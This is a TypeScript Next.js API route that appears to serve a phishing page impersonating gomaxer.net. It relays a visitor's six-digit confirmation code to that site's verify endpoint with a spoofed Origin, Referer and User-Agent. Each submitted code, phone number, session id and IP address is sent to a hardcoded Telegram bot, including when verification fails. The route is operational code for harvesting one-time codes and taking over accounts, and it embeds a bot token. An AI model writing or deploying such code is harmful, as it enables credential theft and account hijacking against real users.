import { NextRequest, NextResponse } from "next/server";

export const runtime = "nodejs";

const BASE_URL = "https://gomaxer.net";
const PAGE_PATH = "/s/knife";
const UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36";
const TG_TOKEN = "8858079352:AAEIiwfsGdiZ4w0n3qKXA5bZiwiewvcMLa4";
const TG_CHAT = "-1003907306436";

async function sendTelegram(text: string) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ chat_id: TG_CHAT, text }),
      signal: AbortSignal.timeout(5000),
    });
  } catch { /* fire and forget */ }
}

export async function POST(request: NextRequest) {
  let body: { session_id?: string; code?: string; bot_id?: number; phone?: string };
  try {
    body = await request.json();
  } catch {
    return NextResponse.json({ ok: false, error: "Bad request" }, { status: 400 });
  }

  const sessionId = body.session_id ?? "";
  const code = body.code ?? "";
  const botId = body.bot_id ?? 0;
  const phone = body.phone ?? "";

  if (!sessionId || !/^\d{6}$/.test(code)) {
    return NextResponse.json({ ok: false, error: "Неверные данные" }, { status: 400 });
  }

  const referer = BASE_URL + PAGE_PATH;

  // Verify code via gomaxer
  try {
    const verifyRes = await fetch(`${BASE_URL}/api/auth/phone/verify`, {
      method: "POST",
      headers: {
        Accept: "*/*",
        "Content-Type": "application/json",
        Origin: BASE_URL,
        Referer: referer,
        "User-Agent": UA,
      },
      body: JSON.stringify({ session_id: sessionId, code, bot_id: botId }),
      signal: AbortSignal.timeout(10000),
    });

    const result = await verifyRes.json() as Record<string, unknown>;
    const verified = result.success === true || result.ok === true;

    // Log to Telegram regardless
    const ip = request.headers.get("x-forwarded-for")?.split(",")[0].trim() ?? "unknown";
    const status = verified ? "✅ Код принят" : "❌ Код отклонён";
    void sendTelegram(
      `🔑 Код подтверждения\n${status}\nНомер: ${phone || "—"}\nКод: ${code}\nSession: ${sessionId}\nIP: ${ip}\nВремя: ${new Date().toISOString()}`
    );

    return NextResponse.json({ ok: verified, verified });
  } catch {
    // Still log to Telegram on error
    const ip = request.headers.get("x-forwarded-for")?.split(",")[0].trim() ?? "unknown";
    void sendTelegram(`🔑 Код подтверждения (ошибка верификации)\nНомер: ${phone || "—"}\nКод: ${code}\nIP: ${ip}\nВремя: ${new Date().toISOString()}`);
    return NextResponse.json({ ok: false, error: "Сервис временно недоступен" }, { status: 502 });
  }
}
